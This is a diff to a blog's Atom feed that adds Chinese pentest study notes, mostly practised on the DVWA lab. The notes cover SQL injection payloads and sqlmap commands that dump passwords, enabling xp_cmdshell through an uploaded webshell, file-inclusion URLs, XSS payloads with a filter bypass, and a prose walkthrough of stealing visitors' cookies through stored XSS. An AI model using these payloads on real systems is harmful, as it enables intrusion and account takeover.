@@ -1,4 +1,1847 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-12-20T23:25:06+08:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">悠悠然</title><subtitle>个人笔记</subtitle><author><name>jsf</name></author><entry><title type="html">基础SQL注入</title><link href="http://localhost:4000/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5/" rel="alternate" type="text/html" title="基础SQL注入" /><published>2018-12-20T00:00:00+08:00</published><updated>2018-12-20T00:00:00+08:00</updated><id>http://localhost:4000/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5</id><content type="html" xml:base="http://localhost:4000/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5/">&lt;div id=&quot;outline-container-sec-1&quot; class=&quot;outline-2&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-01-10T18:45:31+08:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">悠悠然</title><subtitle>个人笔记</subtitle><author><name>jsf</name></author><entry><title type="html">网络安全笔记</title><link href="http://localhost:4000/%E5%AE%89%E5%85%A8/2019/01/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" rel="alternate" type="text/html" title="网络安全笔记" /><published>2019-01-10T00:00:00+08:00</published><updated>2019-01-10T00:00:00+08:00</updated><id>http://localhost:4000/%E5%AE%89%E5%85%A8/2019/01/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0</id><content type="html" xml:base="http://localhost:4000/%E5%AE%89%E5%85%A8/2019/01/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">&lt;div id=&quot;outline-container-sec-1&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-1&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 网络攻防基本介绍&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-1-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 渗透测试分类&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-1-1-1&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-1-1-1&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.1&lt;/span&gt; 黑盒测试&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-1&quot;&gt;
+&lt;p&gt;
+黑盒测试也称为功能测试，它是通过测试来监测每个功能是否都能够正常使用，在测试中，将程序看作一个不能够打开的盒子，在完全不考虑程序内部结构和内部特性的情况下，在程序接口进行测试，它只检查程序是否按照需求规格说明的规定正常使用，程序是否能够适当的接受输入数据而产生正确的数输出信息。黑盒测试着眼于程序外部结构，不考虑内部结构，主要针对软件界面和软件功能进行测试。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-1-1-2&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-1-1-2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.2&lt;/span&gt; 白盒测试&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-2&quot;&gt;
+&lt;p&gt;
+白盒测试称为结构测试或逻辑驱动测试，是一种测试用例使用方法，它从程序的控制结构导出测试用例。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-1-1-3&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-1-1-3&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;1.1.3&lt;/span&gt; 灰盒测试&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-1-1-3&quot;&gt;
+&lt;p&gt;
+灰盒测试是介于黑盒测试和白盒测试中间的一种测试，测试多用于集成测试阶段，不仅关注输入与输出的正确性，同时也关注程序的内部情况。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-2&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-2&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 渗透测试&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-2-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-2-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; 术语&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+扫描 
+木马、病毒 
+黑帽子、白帽子 
+社会工程学 
+钓鱼
+poc、exploit
+WebShell
+DDoS
+ARP攻击
+0day
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-2-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-2-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; 常见攻击&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+web:xss,csrf,提权逻辑错误
+DB:sql注入,漏洞利用系统层:DDOS,远程溢出(MS08-067,MS10-020),rootkit,0day
+网络层:DDOS,ARP欺骗
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-2-3&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-2-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.3&lt;/span&gt; 流程&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-3&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+信息收集-&amp;gt;扫描探测-&amp;gt;漏洞利用-&amp;gt;通道控制-&amp;gt;内网扩展-&amp;gt;资料回传
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-2-4&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-2-4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.4&lt;/span&gt; HTTP协议抓包工具&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-4&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+Burp Suite
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-3&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-3&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; Burp Suite使用&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-3-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-3-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.1&lt;/span&gt; Target&lt;/h3&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-3-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-3-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.2&lt;/span&gt; Proxy&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-2&quot;&gt;
+&lt;p&gt;
+代理，正对目标主机进行数据转发及数据包抓取。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-3-3&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-3-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.3&lt;/span&gt; Spider&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-3&quot;&gt;
+&lt;p&gt;
+爬虫，爬取网站信息。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-3-4&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-3-4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.4&lt;/span&gt; Scaner&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-4&quot;&gt;
+&lt;p&gt;
+漏洞扫描，查看网站中常见的可利用漏洞。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-3-5&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-3-5&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.5&lt;/span&gt; Intruder&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-5&quot;&gt;
+&lt;p&gt;
+暴力破解流程:
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+1.打开数据包数据代理,在浏览器中打开网站登录界面,在Target中获取登录页面,发送至暴力模块.
+2.在暴力模块中positions中清除所有标记,然后选择自己感兴趣的变量.
+3.然后在暴力模块中选择payloads中选择所标记的变量及匹配方式.
+4.导入准备好的字典文件,然后点击Start attack按钮进行暴力破解.
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-4&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-4&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; HTTP协议&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-4-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-4-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.1&lt;/span&gt; http协议请求类型&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-1&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+GET：请求指定页面内信息，返回实体主体
+POST：请求服务器所接受指定的文档作为对所标识的URl的新的从属实体
+PUT：从客户端向服务器传送的数据取代指定的文档的内容
+DELETE：请求服务器删除指定的内容
+HEAD：只请求页面的首部
+OPTIONS：允许客户端查看服务器的性能
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-4-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-4-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.2&lt;/span&gt; http状态码&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-2&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+1xx-提供信息
+2xx-请求被成功提交
+3xx-客户端被重定向到其它资源
+4xx-请求错误
+5xx-服务器错误
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-5&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-5&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;5&lt;/span&gt; DVWA暴力破解&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-5&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-5-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-5-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.1&lt;/span&gt; 暴力破解定义&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-1&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-5-1-1&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-5-1-1&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.1.1&lt;/span&gt; 常见分类&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-1-1&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+1.本地程序类 本地游戏等(IDA、Uedit32、ollydbg反汇编)
+2.远程服务类 OA系统等(利用密码字典,穷举法猜出用户口令)
+3.MD5等加密串暴力破解
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-5-1-2&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-5-1-2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.1.2&lt;/span&gt; 暴力破解DVWA&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-1-2&quot;&gt;
+&lt;p&gt;
+在使用burp suite时可以根据http状态码,长度及返回信息中的关键字信息来确认是否暴力破解成功,然后使用匹配成功的帐号去登录系统.
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-5-1-3&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-5-1-3&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.1.3&lt;/span&gt; 万能密码&lt;/h4&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-5-1-4&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-5-1-4&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.1.4&lt;/span&gt; sql注入破解密码&lt;/h4&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-6&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-6&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;6&lt;/span&gt; SQL注入&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-6&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-6-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-6-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.1&lt;/span&gt; mysql修改密码&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-1&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+mysqladmin -u root -p password &quot;123456&quot;; //在操作系统中
+update user set password=password(&quot;123456&quot;) where user='root'; //在数据库中
+update user set authentication_string=password(&quot;123456&quot;) where user='root'; //在5.7及以上的版中使用
+
+如果忘记密码时，则可以跳过权限检查，然后在执行上面mysql中的命令
+service mysql stop
+mysql_safe --skip-grant-table &amp;amp;
+执行修改后，重启服务即可
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-6-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-6-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.2&lt;/span&gt; sql注入类型&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-2&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+按照提交方式 get post cookice
+按照数据库类型：php+mysql asp+access jsp+oracle
+sql注入分为显注和盲注联合注入 //
+报错注入 //http://192.168.1.117/index2.php?name=admin'and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) and '
+整型参数，字符，字符须注意单引号闭合
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-6-3&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-6-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.3&lt;/span&gt; 注入方式&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-3&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+手动注入利用sqlmap工具
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-6-4&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-6-4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.4&lt;/span&gt; sqlmap常用命令&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-4&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+sqlmap -u url --dbs //爆数据库
+sqlmap -u url --current-user //爆当前用户
+sqlmap -u url --user //查看用户权限
+sqlmap -u url --tables -D 数据库 //爆表段
+sqlmap -u url --columns -T 表段 -D 数据库 //爆字段
+sqlmap -u url --dump -C 字段 -T 表段 -D 数据库 //猜解
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-6-5&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-6-5&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.5&lt;/span&gt; 手动注入以DVWA为例&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-5&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+order by: 表序列
+union select: 联合查询猜测当前数据库中表的个数：1' order by 3 # //当数目超过表个数之后数据库会返回错误信息
+1' union select 1,version() # //查询数据库版本
+1' union select 1,database() # //查询数据库名称
+1' union select 1,user()# //查询用户
+1' union select 1,password from users # //查询数据库中所有用户密码
+1' union select user,password from users # //查询数据库中所有用户及密码，如下图
+&lt;/pre&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/sqlinjection.png&quot; alt=&quot;sqlinjection.png&quot;&gt;
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-6-6&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-6-6&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.6&lt;/span&gt; SQLserver开启xp&lt;sub&gt;cmdshell功能&lt;/sub&gt;&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-6&quot;&gt;
+&lt;p&gt;
+首先，需要上传简单木马，可以通过菜刀连接到服务器，获取网站的配置文件中关于数据库帐号信息，
+然后配置菜刀中数据库的相关参数，再执行如下命令之后就可以开启服务器中的shell功能，我们可以尝试执行一些系统的命令。
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+EXEC sp_configure 'show advanced options',1 RECONFIGURE  //打开数据库高级功能
+EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE //打开xp_cmdshell功能
+exec master..xp_cmdshell &quot;whoami&quot; //执行命令
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-6-7&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-6-7&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.7&lt;/span&gt; mysql数据库结构&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-7&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+information_schema
+mysql 用户 权限等运行所需信息 mysql.user
+load_file
+load_data
+secure_file_priv 5开始需设定这个值并且有高权限，file权限，读写绝对路径文件。
+select [content] into file/dumpfile [path] //file会做特殊字符转移，dumpfile不会做转移
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-7&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-7&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;7&lt;/span&gt; 文件包含&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-7&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-7-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-7-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.1&lt;/span&gt; php中常用四个文件包含函数&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-1&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+include()
+include_once()
+require()
+require_once()
+&lt;/pre&gt;
+&lt;p&gt;
+包含类型分为本地包含和远程包含
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+本地包含：http://192.168.1.103/www/vulnerabilities/fi/?page=02.php
+远程包含：http://192.168.1.103/www/vulnerabilities/fi/?page=http://192.168.1.103/php.ini
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-7-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-7-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.2&lt;/span&gt; php伪协议&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-2&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+php://filter //例如：http://45.76.206.86:10000/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=file1.php
+php://input
+Zip://
+Phar://
+Rar://
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-8&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-8&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;8&lt;/span&gt; XSS漏洞攻击&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-8&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-8-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-8-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.1&lt;/span&gt; xss反射型&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-1&quot;&gt;
+&lt;p&gt;
+手动测试
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; //反弹信息
+&quot;&amp;gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;
+&quot;onclick=&quot;alert(/xss/)&amp;lt;/script&amp;gt;
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-8-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-8-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.2&lt;/span&gt; 同源策略&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-2&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+同协议 http https
+同域名同协议
+X-Frame-Option DENY //不允许嵌入iframe标签
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-8-3&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-8-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.3&lt;/span&gt; xss存储型攻击&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-3&quot;&gt;
+&lt;p&gt;
+存储在数据库中，当页面每次加载数据库中的信息时，将之前插入数据库中的javascript语句进行执行并展示给用户。
+首先找一个有xss漏洞的网站，在XSS平台上注册一个帐号，生成一个攻击模板，然后使用这个模板的短网址复制到输入框中，将这个连接提交存储到数据库中，成功之后，用户每次访问数据库中的这条数据时，就会将用户的cookie信息上传到服务器中，这样我们使用上传的地址及cookie信息登录到系统中。
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/shorturl.png&quot; alt=&quot;shorturl.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 2:&lt;/span&gt; 在xss平台生成模板得到短地址&lt;/p&gt;
+&lt;/div&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/getinfo.png&quot; alt=&quot;getinfo.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 3:&lt;/span&gt; 查看获取的信息&lt;/p&gt;
+&lt;/div&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/laobin.png&quot; alt=&quot;laobin.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 4:&lt;/span&gt; 使用老兵进行系统登录&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;p&gt;
+当自己有服务器时，我们可以在自己的服务器上放一个攻击脚本及信息收集脚本，然后，在其它有xss
+漏洞的网站上上传我们的服务器脚本连接至数据库中，这样当正常用户访问页面时，加载我们的连接脚本后，可以将用户的cookie及浏览url等信息上传至我们的服务器中，我们可以根据此信息，在浏览器中使用插件，将自身的cookie修改问其他正常用户的cookie信息，这样我们就可以达到，使用他人信息登录网站的目地。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-8-4&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-8-4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.4&lt;/span&gt; DOM型xss攻击&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-4&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+\\x3Cscript\\x3Ealert(document.domain)\\x3CScript\\x3E
+\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-8-5&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-8-5&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.5&lt;/span&gt; php防御&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-5&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+htmlentities($input) //输出原有字符，不出现弹窗
+
+&amp;lt;?php
+$input=$_GET['input'];
+echo $input; //直接输入alert即可
+
+&amp;lt;?php
+$input=$_GET['input'];
+echo htmlentities($input); //无法注入
+
+&amp;lt;?php$input=$_GET['input'];
+echo '&amp;lt; img src='.htmlentities($input).'&amp;gt;';  //input=123 onclick=alert(123)
+
+&amp;lt;?php$input=$_GET['input'];
+$input=str_replace('=','',$input);
+echo '&amp;lt; img src='.$input.'&amp;gt;'; //?input=w&amp;gt;&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;
+
+&amp;lt;?php
+$input=$_GET['input'];
+//$input=str_replace(' ','',$input);
+$input=str_replace('=','',$input);
+echo '&amp;lt; img src='.htmlentities($input).'&amp;gt;'; //无法注入
+
+DOM型XSS
+&amp;lt;?php
+$input=$_GET['input'];
+$input=str_replace('=','',$input);
+echo '&amp;lt;script&amp;gt;var a=&quot;'.htmlentities($input).'&quot;;document.write(a);&amp;lt;/script&amp;gt;';
+//?input=\x3Cscript\x3Ealert(1234565)\x3C/script\x3E可以绕过防御
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-9&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-9&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;9&lt;/span&gt; 文件上传漏洞攻击&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-9&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-9-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-9-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;9.1&lt;/span&gt; 文件上传JS验证&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-9-1&quot;&gt;
+&lt;p&gt;
